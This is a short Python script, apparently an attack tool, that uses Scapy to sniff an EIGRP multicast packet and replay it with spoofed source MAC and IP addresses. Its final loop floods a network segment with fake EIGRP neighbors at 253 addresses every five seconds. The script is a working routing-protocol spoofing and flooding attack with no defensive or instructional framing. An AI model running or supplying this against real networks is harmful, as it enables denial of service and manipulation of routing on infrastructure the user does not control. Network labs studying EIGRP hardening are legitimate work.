# In the name of God

from scapy.all import *
### EIGRP Manipulation (fake neighbor creation) ###

load_contrib('eigrp')

# snif an eigrp packet
pkt = sniff(iface='local1', count=1, filter='ip dst 224.0.0.10')

# change the source mac address (outgoing interface mac)
pkt[0].src = '00:00:00:00:00:01'

# change the source ip address (outgoing interface ip)
pkt[0][IP].src = '172.16.1.1'

# change checksum
pkt[0][IP].chksum = None

# send packet
sendp(pkt[0], loop=0, verbose=1, iface='local1')

# or with loop
while True:
    for i in range(1,254):
        ipaddr = '172.16.1.%s' %(i)
        print(f'neighbor at {ipaddr}')
        pkt[0].src = RandMAC()
        pkt[0][IP].src = ipaddr
        pkt[0][IP].chksum = None
        sendp(pkt[0], iface='local1', loop=0, verbose=1)
    print('5 sec halt')
    time.sleep(5)

